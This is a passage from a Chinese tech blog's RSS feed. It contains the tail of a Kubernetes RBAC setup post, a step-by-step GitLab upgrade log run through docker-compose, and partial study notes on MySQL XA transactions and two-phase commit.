&lt;/span>&lt;span class="se">&lt;/span> --verb&lt;span class="o">=&lt;/span>list &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --verb&lt;span class="o">=&lt;/span>update &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --verb&lt;span class="o">=&lt;/span>delete &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --resource&lt;span class="o">=&lt;/span>pods &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --resource&lt;span class="o">=&lt;/span>deployment &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --resource&lt;span class="o">=&lt;/span>statefulset &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --resource&lt;span class="o">=&lt;/span>service &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --resource&lt;span class="o">=&lt;/span>configmap
kubectl create rolebinding gitlab-ci-binding-gitlab --role&lt;span class="o">=&lt;/span>gitlab-ci --user&lt;span class="o">=&lt;/span>gitlab
kubectl config set-credentials gitlab --client-key&lt;span class="o">=&lt;/span>gitlab.key --client-certificate&lt;span class="o">=&lt;/span>gitlab.crt --embed-certs&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span>
kubectl config set-context ci --cluster&lt;span class="o">=&lt;/span>office --user&lt;span class="o">=&lt;/span>gitlab --namespace&lt;span class="o">=&lt;/span>version4
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="存在的问题">存在的问题&lt;/h2>
&lt;p>脚本跑完后发现还不能使用 &lt;code>kubectl get pods&lt;/code>，错误 Unauthorized。&lt;/p>
&lt;p>再看了一遍文档，发现有这么一句。&lt;/p>
&lt;blockquote>
&lt;p>下面的脚本展示了如何生成 PKI 私钥和 CSR。 设置 CSR 的 CN 和 O 属性很重要。CN 是用户名，O 是该用户归属的组。 你可以参考 RBAC 了解标准组的信息。&lt;/p>
&lt;/blockquote>
&lt;p>顺着链接去看了下 RBAC，结果也没找到什么“标准组”。&lt;/p>
&lt;p>对于文中说的两个“很重要”的字段，CN 我猜测是 Common Name，O 就是 Organization。现在就不知道怎么填 O，行吧。&lt;/p>
&lt;p>等啥时候搞清楚了再补一篇。&lt;/p></description></item><item><title>升级公司的 GitLab</title><link>https://nnnewb.github.io/blog/p/%E5%8D%87%E7%BA%A7%E5%85%AC%E5%8F%B8%E7%9A%84-gitlab/</link><pubDate>Thu, 15 Jul 2021 16:02:41 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%8D%87%E7%BA%A7%E5%85%AC%E5%8F%B8%E7%9A%84-gitlab/</guid><description>&lt;p>公司目前跑的 gitlab 是很久以前部署的，当前版本 &lt;em>8.4.2&lt;/em> 。升级目标是 &lt;em>13.12.Z&lt;/em> 。部署方式是 docker 。&lt;/p>
&lt;!-- more -->
&lt;p>宿主机配置不高，系统 &lt;em>Ubuntu 15.04&lt;/em> 。眼下这个时间，这个Ubuntu版本，基本宣告没法用了。直接在线升级容易把引导搞挂，到时候还得亲自去实体机上折腾引导，麻烦。暂时不管宿主机。&lt;/p>
&lt;h2 id="情况概述">情况概述&lt;/h2>
&lt;p>因为 GitLab 版本实在太低了，以至于连一个能集成的 CI/CD 工具都找不到。即使 jenkins 都只能很勉强地动起来，偏偏 jenkins 还不能满足需要（也可能是我太菜，反正公司没人玩得转 jenkins）。&lt;/p>
&lt;p>但开发需要 CI/CD 来解决持续构建和部署的问题，不得不考虑升级了。&lt;/p>
&lt;h2 id="1-备份">1. 备份&lt;/h2>
&lt;p>什么都别说了，开干前最重要的事情就是备份，免得把自己玩死。&lt;/p>
&lt;p>最常用的备份手段自然是 &lt;code>tar&lt;/code> 。不过 gitlab 数据目录实在太大了，要是直接运行 &lt;code>tar -czpf gitlab.tar.gz ./gitlab&lt;/code> 不知道跑多久，也不知道有没有卡死。&lt;/p>
&lt;p>于是上技术手段：用 &lt;code>pv&lt;/code> 显示个进度条。&lt;/p>
&lt;p>pv 项目的首页在 &lt;a class="link" href="http://www.ivarch.com/programs/pv.shtml" target="_blank" rel="noopener"
>ivarch.com&lt;/a>。因为服务器还在跑&lt;em>ubuntu 15.10&lt;/em>，现在连个能用的源都没啦。只好下载了源码，在 wsl 里编译好推上去。&lt;/p>
&lt;p>最终命令如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo tar cf - ./gitlab -P &lt;span class="p">|&lt;/span> pv -s &lt;span class="k">$(&lt;/span>sudo du -sb ./gitlab &lt;span class="p">|&lt;/span> awk &lt;span class="s1">&amp;#39;{print $1}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span> &lt;span class="p">|&lt;/span> gzip &amp;gt; gitlab.tar.gz
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为啥 sudo 呢，postgres 数据库和 redis 数据都没有读权限，没辙。&lt;/p>
&lt;h2 id="2-升级总体思路">2. 升级总体思路&lt;/h2>
&lt;p>gitlab 的手册还是比较全面的。在&lt;a class="link" href="https://docs.gitlab.com/ee/update/index.html#upgrading-to-a-new-major-version" target="_blank" rel="noopener"
>upgrading to a new major version&lt;/a> 这篇文档提到的说法，跨大版本升级主要分三步：&lt;/p>
&lt;ol>
&lt;li>升级至当前大版本(&lt;em>major version&lt;/em>)的最新小版本(&lt;em>latest minor version&lt;/em>)&lt;/li>
&lt;li>升级至目标大版本(&lt;em>target major version&lt;/em>)的首个小版本(&lt;em>first minor version&lt;/em>)&lt;/li>
&lt;li>继续升级至更新的版本&lt;/li>
&lt;/ol>
&lt;p>根据 &lt;a class="link" href="https://docs.gitlab.com/ee/update/index.html#upgrades-from-versions-earlier-than-812" target="_blank" rel="noopener"
>gitlab upgrading guide 的说法&lt;/a>，版本低于 &lt;em>8.11.Z&lt;/em> 时，先更新到 &lt;em>8.12.0&lt;/em> 是比较稳妥的方案。&lt;/p>
&lt;p>so 开干。&lt;/p>
&lt;h2 id="3-升级至-8120">3. 升级至 8.12.0&lt;/h2>
&lt;p>由于部署方式是 docker（准确的说是 docker-compose），所以按照&lt;a class="link" href="https://docs.gitlab.com/ee/install/docker.html#update-gitlab-using-docker-engine" target="_blank" rel="noopener"
>Update GitLab Using Docker Engine&lt;/a> 的说法，我们先停止容器，然后直接修改镜像标签。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">docker-compose stop
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">gitlab&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">sameersbn/gitlab:8.12.0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># &amp;lt;= sameersbn/gitlab:8.4.2&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再启动&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">docker-compose up -d
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="故障gitlab_secrets_otp_key_base-must-set">故障：GITLAB_SECRETS_OTP_KEY_BASE must set&lt;/h3>
&lt;p>使用的镜像 &lt;code>sameersbn/docker-gitlab&lt;/code> 需要这几个环境变量，&lt;a class="link" href="https://github.com/sameersbn/docker-gitlab#quick-start" target="_blank" rel="noopener"
>参考文档&lt;/a>完成设置。&lt;/p>
&lt;h3 id="故障you-must-enable-the-pg_trgm-extension">故障：You must enable the pg_trgm extension&lt;/h3>
&lt;p>这个故障就比较奇怪了，但还是可以处理。&lt;/p>
&lt;p>先设置一下 postgres 账号密码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">docker &lt;span class="nb">exec&lt;/span> -it gitlab_postgresql_1 psql -U postgres
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="err">\&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">postgres&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输入新密码，按 ctrl+d 退出。&lt;/p>
&lt;p>再用随便啥连接上去，运行 &lt;code>create extension pg_trgm;&lt;/code> 就完事了。&lt;/p>
&lt;p>最后就是重启下容器，gitlab 自动迁移完成后即可访问。&lt;/p>
&lt;h2 id="4-升级至-v8174">4. 升级至 v8.17.4&lt;/h2>
&lt;p>原本应该升级到 v8.17.7，但 &lt;code>sameersbn/docker-gitlab&lt;/code> 没提供这个版本的镜像，只能先升级到 v8.17.4 ，求老天保佑别折腾出问题。&lt;/p>
&lt;p>老规矩改了 docker-compose ，然后 up 。&lt;/p>
&lt;p>直接成功，没有错误。&lt;/p>
&lt;h2 id="5-升级至-v955">5. 升级至 v9.5.5&lt;/h2>
&lt;p>老规矩，还是缺少镜像，原本应该升级到 v9.5.10。&lt;/p>
&lt;p>改了 docker-compose 再 up。&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="6-升级至-v1084">6. 升级至 v10.8.4&lt;/h2>
&lt;p>原本应该升级 v10.8.7 。懒得说了。改了 compose 再 up 。&lt;/p>
&lt;h3 id="故障this-probably-isnt-the-expected-value-for-this-secret">故障：This probably isn&amp;rsquo;t the expected value for this secret&lt;/h3>
&lt;p>错误内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">This probably isn&amp;#39;t the expected value for this secret. To keep using a literal Erb string in config/secrets.yml, replace &amp;amp;lt;%with&amp;amp;lt;%%.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不知道为什么，重启了一次容器后就恢复了。&lt;/p>
&lt;p>可以参考下&lt;a class="link" href="https://github.com/sameersbn/docker-gitlab/issues/1625" target="_blank" rel="noopener"
>这个&lt;/a>。&lt;/p>
&lt;h2 id="7-升级至-v11113">7. 升级至 v11.11.3&lt;/h2>
&lt;p>根据 v12 的升级指引，&lt;/p>
&lt;blockquote>
&lt;p>In 12.0.0 we made various database related changes. These changes require that users first upgrade to the latest 11.11 patch release.&lt;/p>
&lt;/blockquote>
&lt;p>必须先升级到 v11.11.Z 版本，再升级 v12.0.Z 才能完成数据库迁移。&lt;/p>
&lt;p>于是先升级到 v11.11.3 (也是因为没有 v11.11.8 的镜像)。&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="8-升级至-v1204">8. 升级至 v12.0.4&lt;/h2>
&lt;p>根据 12.0 升级指引，先升级到 12.0.Z 版本来完成 11-&amp;gt;12 的迁移，再继续升级。&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="9-升级至-v1216">9. 升级至 v12.1.6&lt;/h2>
&lt;p>根据 12.1 升级指引，在升级到 12.10.Z 之前，必须先升级到 12.1.Z 。&lt;/p>
&lt;blockquote>
&lt;p>If you are planning to upgrade from 12.0.Z to 12.10.Z, it is necessary to perform an intermediary upgrade to 12.1.Z before upgrading to 12.10.Z to avoid issues like #215141.&lt;/p>
&lt;/blockquote>
&lt;p>成功。&lt;/p>
&lt;h2 id="10-升级至-v12106-1">10. 升级至 v12.10.6-1&lt;/h2>
&lt;p>缺少最新的 12.10.Z 镜像，先升级到能升级到的 12.10.Z 最高版本。&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="11-升级至-v1306">11. 升级至 v13.0.6&lt;/h2>
&lt;p>这个版本对 postgres 数据库版本有要求，故升级 postgresql 到 9.6.4 版本。镜像自动完成了数据迁移。&lt;/p>
&lt;p>之后启动 gitlab 完成升级。&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="12-升级至-v13124">12. 升级至 v13.12.4&lt;/h2>
&lt;p>这个版本对 postgres 数据库版本又有要求，最低在 11 以上，故升级 postgresql 到 11-20200524 (sameersbn/postgresql)。&lt;/p>
&lt;p>同时，需要安装插件 &lt;code>btree_gist&lt;/code>，故连接 postgresql 数据库创建。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">extension&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">exists&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">btree_gist&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后启动 gitlab 完成升级。&lt;/p>
&lt;h2 id="13-总结">13. 总结&lt;/h2>
&lt;p>由于 gitlab 设计良好，升级基本没有太大难度。按照文档的升级路线逐个版本升级即可。&lt;/p>
&lt;p>也是我运气好，在升级 10.8.Z 版本的时候遇到的问题重启后自己消失了，不然光是这个问题可能就要折腾很久。&lt;/p>
&lt;p>最终 gitlab 版本停留在 13.12.Z ，14.0 虽然已经发布了，但出于稳定考虑还是先不升级。&lt;/p></description></item><item><title>MySQL XA 事务和分布式事务处理模型：2阶段提交</title><link>https://nnnewb.github.io/blog/p/mysql-xa-distributed-transaction-processing-model-2pc/</link><pubDate>Fri, 09 Jul 2021 09:29:22 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/mysql-xa-distributed-transaction-processing-model-2pc/</guid><description>&lt;p>关于 MySQL XA 事务和 2PC（两阶段提交）分布式事务处理模型（&lt;em>Distributed Transaction Processing, DTP Model&lt;/em>）的学习笔记。&lt;/p>
&lt;!-- more -->
&lt;h2 id="事务">事务&lt;/h2>
&lt;h3 id="分布式事务xa">分布式事务XA&lt;/h3>
&lt;h4 id="介绍">介绍&lt;/h4>
&lt;p>MySQL内建分布式事务支持（&lt;code>XA&lt;/code>），参考文档列出如下&lt;/p>
&lt;ul>
&lt;li>[MySQL Manual - XA](&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/glossary.html#glos_xa" target="_blank" rel="noopener"
>MySQL :: MySQL 8.0 Reference Manual :: MySQL Glossary&lt;/a>)&lt;/li>
&lt;li>[MySQL Manual - XA Transaction](&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/xa.html" target="_blank" rel="noopener"
>MySQL :: MySQL 8.0 Reference Manual :: 13.3.8 XA Transactions&lt;/a>)&lt;/li>
&lt;li>[MySQL Manual - XA Transaction Statements](&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/xa-statements.html" target="_blank" rel="noopener"
>MySQL :: MySQL 8.0 Reference Manual :: 13.3.8.1 XA Transaction SQL Statements&lt;/a>)&lt;/li>
&lt;li>[MySQL Manual - XA Transaction State](&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/xa-states.html" target="_blank" rel="noopener"
>MySQL :: MySQL 8.0 Reference Manual :: 13.3.8.2 XA Transaction States&lt;/a>)&lt;/li>
&lt;/ul>
&lt;p>XA 事务在 InnoDB 引擎中可用。MySQL XA 事务实现基于 X/Open CAE 文档 《Distributed Transaction Processing: The XA Specification》。这份文档由 &lt;em>Open Group&lt;/em> 发布，可以在 &lt;a class="link" href="http://www.opengroup.org/public/pubs/catalog/c193.htm" target="_blank" rel="noopener"
>http://www.opengroup.org/public/pubs/catalog/c193.htm&lt;/a> 访问。当前 XA 实现的局限可以在 &lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/xa-restrictions.html" target="_blank" rel="noopener"
>Section 13.3.8.3, “Restrictions on XA Transactions”&lt;/a> 查看。&lt;/p>
&lt;p>&amp;hellip;&lt;/p>
&lt;p>XA 事务是全局事务关联的一组事务性动作，要么全部成功，要么全部回滚。本质上，这是让 ACID 属性“提升了一层”，让多个ACID事务可以作为一个全局操作的一部分执行，使得这个全局操作也具备ACID属性。（对于非分布式事务，应用如果对读敏感，则&lt;code>SERIALIZABLE&lt;/code>更推荐。&lt;code>REPEATABLE READ&lt;/code> 在分布式事务中并不是很有效。）&lt;/p>
&lt;h4 id="事务模型">事务模型&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/MySQL-XA-and-2PC-DTP-model/%e4%ba%8b%e5%8a%a1%e6%a8%a1%e5%9e%8b.webp"
loading="lazy"
alt="DTM"
>&lt;/p>
&lt;p>其中：&lt;/p>
&lt;ul>
&lt;li>**AP：**用户程序&lt;/li>
&lt;li>**RMs：**数据库&lt;/li>
&lt;li>**TM：**事务管理器&lt;/li>
&lt;/ul>
&lt;p>用户程序不用介绍。&lt;/p>
&lt;p>根据 Open Group 在 Distributed Transaction Processing Model 中的定义，一个典型的 RM 可以是一个支持事务的数据库（DBMS）。&lt;/p>
&lt;p>TM 则是协调整个二阶段提交过程的中介。AP从TM获得XID，完成 &lt;code>XA START&lt;/code> 到 &lt;code>XA END&lt;/code> ，然后告知 TM 就绪。TM提取本次事务的所有XID，向RMs发出&lt;code>XA PREPARE&lt;/code>请求，如果失败则对每个 XID 发出 &lt;code>XA ROLLBACK&lt;/code> ，成功则继续发出 &lt;code>XA COMMIT&lt;/code> 。&lt;/p>
&lt;p>需注意的是，&lt;code>XA PREPARE&lt;/code> 失败可以通知其他事务回滚，但&lt;code>XA COMMIT&lt;/code> 失败则只能等待数据库恢复，再行重试。&lt;code>XA PREPARE&lt;/code>一旦成功，则&lt;code>XA COMMIT&lt;/code> 一定成功（或者说必须成功）。&lt;/p>
&lt;p>TM 实现要求自身崩溃后必须能清理恢复，防止出现XA事务死锁。&lt;/p>
&lt;ul>
&lt;li>继续 PREPARE 需要提交的事务&lt;/li>
&lt;li>继续 ROLLBACK 未完成 ROLLBACK 的事务&lt;/li>
&lt;li>继续 COMMIT 未能 COMMIT 的事务
&lt;ul>
&lt;li>未能 COMMIT 成功则需要重试直到成功&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>几个 TM 角色（或整套方案）的实现：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/seata/seata/" target="_blank" rel="noopener"
>seata/seata: Seata is an easy-to-use, high-performance, open source distributed transaction solution. (github.com)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://open.unionpay.com/tjweb/product/detail?proId=43" target="_blank" rel="noopener"
>UPSQL Proxy-技术产品- 中国银联开放平台 (unionpay.com)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://cloud.tencent.com/product/dcdb/" target="_blank" rel="noopener"
>分布式数据库TDSQL MySQL版_企业级分布式数据库解决方案 - 腾讯云 (tencent.com)&lt;/a>&lt;/li>
&lt;/ul>
&lt;h4 id="基本用法">基本用法&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">{&lt;/span>&lt;span class="n">START&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">BEGIN&lt;/span>&lt;span class="err">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xid&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">RESUME&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">END&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xid&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">SUSPEND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="k">FOR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MIGRATE&lt;/span>&lt;span class="p">]]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PREPARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xid&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">COMMIT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xid&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ONE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PHASE&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ROLLBACK&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xid&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">RECOVER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="k">CONVERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XID&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中 &lt;code>XA START&lt;/code> 后跟随的 &lt;code>JOIN&lt;/code>和&lt;code>RESUME&lt;/code>子句没有任何效果。&lt;/p>
&lt;p>&lt;code>XA END&lt;/code> 后跟随的 &lt;code>SUSPEND&lt;/code> 和 &lt;code>FOR MIGRATE&lt;/code> 子句也没有任何效果。&lt;/p>
&lt;p>任何&lt;code>XA&lt;/code>语句都以&lt;code>XA&lt;/code>关键字开头，大多&lt;code>XA&lt;/code>语句都需要&lt;code>xid&lt;/code>值。&lt;code>xid&lt;/code> 是 &lt;strong>XA事务的标识符&lt;/strong> ，它确定语句应用到哪个XA事务上。&lt;/p>
&lt;p>&lt;code>xid&lt;/code>值可以由客户端指定或 MySQL 服务器生成。&lt;/p>
&lt;p>一个&lt;code>xid&lt;/code>值有一到三个部分：&lt;/p>
&lt;pre>&lt;code>xid: gtrid [, bqual [, formatID ]]
&lt;/code>&lt;/pre>&lt;p>&lt;code>gtrid&lt;/code> 是&lt;strong>全局事务标识符&lt;/strong> ，&lt;code>bqual&lt;/code> 是&lt;strong>分支修饰符&lt;/strong>，&lt;code>formatID&lt;/code>是一个标记 &lt;code>gtrid&lt;/code> 和 &lt;code>bqual&lt;/code> 格式的数字。&lt;/p>
&lt;p>&lt;code>gtrid&lt;/code> 和 &lt;code>bqual&lt;/code> 必须是字符串字面量，最多不超过 64 &lt;strong>字节&lt;/strong> 长。&lt;code>gtrid&lt;/code> 和 &lt;code>bqual&lt;/code> 可以以多种方式指定，可以用引号包围的字符串（&lt;code>'ab'&lt;/code>）；十六进制字符串（&lt;code>X'6162'&lt;/code>，&lt;code>0x6162&lt;/code>）；或者二进制值（&lt;code>b'nnn'&lt;/code>）。&lt;/p>
&lt;p>&lt;code>formatID&lt;/code> 必须是一个无符号整数。&lt;/p>
&lt;p>&lt;code>gtrid&lt;/code> 和 &lt;code>bqual&lt;/code> 值在 MySQL 服务器的底层 XA 支持程序中被解释为字节。不过，服务器在解释包含XA语句的SQL时，可能设置了特定字符集。安全起见，最好将 &lt;code>gtrid&lt;/code> 和 &lt;code>bqual&lt;/code> 写作十六进制字符串形式。&lt;/p>
&lt;p>&lt;code>xid&lt;/code> 值通常是由事务管理器生成。一个事务管理器产生的&lt;code>xid&lt;/code>必须与另一个事务管理器产生的&lt;code>xid&lt;/code>不同。一个给定的事务管理器必须能在 &lt;code>XA RECOVER&lt;/code> 返回的 &lt;code>xid&lt;/code> 列表中识别出属于自己的 &lt;code>xid&lt;/code> 。&lt;/p>
&lt;p>&lt;code>XA START xid&lt;/code> 以指定的 &lt;code>xid&lt;/code> 开启一个新 XA 事务。每个 XA 事务必须包含一个唯一的 &lt;code>xid&lt;/code> ，&lt;code>xid&lt;/code> 不能正在被另一个 XA 事务使用。唯一性通过 &lt;code>gtrid&lt;/code> 与 &lt;code>bqual&lt;/code> 评估。该 XA 事务的后续 XA 语句都必须指定&lt;code>XA START&lt;/code>中指定的 &lt;code>xid&lt;/code>。如果使用XA语句但没有指定一个对应XA事务的&lt;code>xid&lt;/code>，则产生一个错误。&lt;/p>
&lt;p>多个XA事务可以是同一个全局事务的组成部分。在同一个全局事务中所有XA事务的&lt;code>xid&lt;/code>必须使用同一个 &lt;code>gtrid&lt;/code> 值。因此，&lt;code>gtrid&lt;/code> 必须全局唯一以避免混淆。全局事务中XA事务&lt;code>xid&lt;/code> 的 &lt;code>bqual&lt;/code> 部分必须互不相同。（要求 &lt;code>bqual&lt;/code> 不同是当前MySQL实现的限制，并不是XA规范的一部分。）&lt;/p>
&lt;p>&lt;code>XA RECOVER&lt;/code> 语句返回 MySQL 服务器中处于 &lt;code>PREPARED&lt;/code> 状态的 XA 事务信息。输出中每一行都是一个服务器上的 XA 事务，不论是哪个客户端启动的事务。&lt;/p>
&lt;p>执行 &lt;code>XA RECOVER&lt;/code> 需要 &lt;code>XA_RECOVER_ADMIN&lt;/code> 特权。这个特权需求是为了防止用户发现其他不属于自己的事务&lt;code>xid&lt;/code>，不影响XA事务的正常提交和回滚。&lt;/p>
&lt;p>&lt;code>XA RECOVER&lt;/code> 输出类似下面这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">RECOVER&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">+----------+--------------+--------------+--------+&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">formatID&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">gtrid_length&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bqual_length&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">+----------+--------------+--------------+--------+&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">abcdef&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="o">+----------+--------------+--------------+--------+&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中：&lt;/p>
&lt;ul>
&lt;li>&lt;code>formatID&lt;/code> 是 &lt;code>xid&lt;/code> 中的 &lt;code>formatID&lt;/code> 部分&lt;/li>
&lt;li>&lt;code>gtrid_length&lt;/code> 是 &lt;code>xid&lt;/code> 中 &lt;code>gtrid&lt;/code> 部分的长度（字节单位）&lt;/li>
&lt;li>&lt;code>bqual_length&lt;/code> 是 &lt;code>xid&lt;/code> 中 &lt;code>bqual&lt;/code> 部分的长度（字节单位）&lt;/li>
&lt;/ul>
&lt;p>XID值可能包含不可打印的字符。&lt;code>XA RECOVER&lt;/code> 允许一个可选的 &lt;code>CONVERT XID&lt;/code> 子句，以便客户端可以请求十六进制格式的 XID 值。&lt;/p>
&lt;h4 id="事务状态">事务状态&lt;/h4>
&lt;p>一个 XA 事务经历以下状态&lt;/p>
&lt;ol>
&lt;li>使用&lt;code>XA START&lt;/code>启动的XA事务，进入&lt;code>ACTIVE&lt;/code>状态。&lt;/li>
&lt;li>一个处于&lt;code>ACTIVE&lt;/code>状态的XA事务，可以发出SQL语句填充事务，然后发出&lt;code>XA END&lt;/code>语句。&lt;code>XA END&lt;/code>语句令XA事务进入&lt;code>IDLE&lt;/code>状态。&lt;/li>
&lt;li>一个处于&lt;code>IDLE&lt;/code>状态的XA事务，可以发出&lt;code>XA PREPARE&lt;/code>语句或&lt;code>XA COMMIT ... ONE PHASE&lt;/code>语句。
&lt;ul>
